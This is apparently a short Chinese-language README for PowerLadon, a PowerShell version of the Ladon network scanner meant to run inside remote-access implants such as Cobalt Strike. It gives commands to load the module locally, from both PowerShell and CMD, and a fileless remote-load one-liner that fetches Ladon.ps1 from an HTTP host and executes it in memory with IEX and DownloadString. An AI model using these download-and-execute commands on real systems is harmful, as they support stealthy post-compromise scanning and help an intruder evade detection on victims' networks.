# PowerLadon
Ladon NetScan For PowerShell
### PowerLadon
PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br>
PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。<br>

#### 0x001 PowerShell本地加载<br>
适用于支持PowerShell交互远控或Shell，如Cobalt Strike
```bash
> powershell 
> Import-Module .\Ladon.ps1
> Ladon OnlinePC
```
<img src=https://k8gege.github.io/k8img/Ladon/PowerLadon.gif></img>

#### 0x002 Cmd本地加载
适用于还没跟上时代的远控或Shell只支持CMD交互
```bash
> powershell Import-Module .\Ladon.ps1;Ladon OnlinePC
```
<img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSLadon.gif></img>

#### 0x003 Cmd远程加载
适用于还没跟上时代的远控或Shell只支持CMD交互
```bash
> powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"
```
<img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSRemoteLadon.gif></img>
